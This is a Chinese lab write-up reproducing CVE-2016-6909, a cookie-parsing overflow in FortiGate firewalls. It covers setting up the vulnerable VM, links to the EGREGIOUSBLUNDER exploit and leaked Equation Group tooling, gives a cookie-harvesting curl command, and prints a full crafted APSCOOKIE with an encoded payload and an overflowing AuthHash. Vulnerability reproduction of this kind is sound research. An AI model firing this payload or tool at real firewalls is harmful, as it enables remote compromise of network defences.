原文链接：[CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252842#h2-0)

## 环境安装
参考链接：[【高级篇 / FortiGate-VM】(6.4) ❀ 02. 安装并启用 FortiGate VM ❀ FortiGate 防火墙_飞塔防火墙虚拟机_飞塔老梅子的博客-CSDN博客](https://blog.csdn.net/meigang2012/article/details/105246640)

在网上找到FGT_VM-v400-build0482下载，然后解压，双击`Fortigate-VM.orf` 用VMware打开

![](images/Pasted%20image%2020230512214210.png)

然后进行虚拟机设置，设置第一个网络适配器为VMnet8模式

![](images/Pasted%20image%2020230512214421.png)

设置好后运行虚拟机，账号为`admin` ，密码为空。进去后进行网络设置，ip要和VMnet8在同一个网段，然后主机和防火墙就能ping通了。
```
# 显示接口信息
show system interface
# 配置静态ip
config system interface
edit port1
set mode static
set ip 192.168.219.99/24
set allowaccess ping http https fgfm snmp ssh telnet
end
```

通过`fnsysctl`命令可以执行一些linux基本命令。
```
fnsysctl ls
```

## 漏洞分析
资源下载：

[Fortigate Firewalls - 'EGREGIOUSBLUNDER' Remote Code Execution - Hardware webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/40276)

[AlphabugX/nopen: NOPEN Tool 又名“morerats” 莫雷斯特，是方程式工具包里的工具。 (github.com)](https://github.com/AlphabugX/nopen/tree/main)

获取一个cookie num
```
curl -X HEAD -v http://192.168.219.99/login 2>&1 | grep 'APSCOOKIE'
```

![](images/Pasted%20image%2020230513110255.png)

使用 `egregiousblunder` 测试该漏洞，如下：
![](images/Pasted%20image%2020230513105735.png)

此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯
![](images/Pasted%20image%2020230513105818.png)

使用 postman 简单仿造该 http 请求如下，使用字符 `A` 简单填充 AuthHash 字段：
```
Cookie:
APSCOOKIE_3943997904=Era=0&Payload=YPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCrSDScPhJeOLyykfQZ0p6du+AOYKT/5qGGQ3z00ca5yQ2PGjz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8qLIjOtLB/I3e7DI6SRyGay/xxEJu30VQfm/yU/RMIL/Al+TcHpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![](images/Pasted%20image%2020230513113918.png)

当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细

![](images/Pasted%20image%2020230513113828.png)




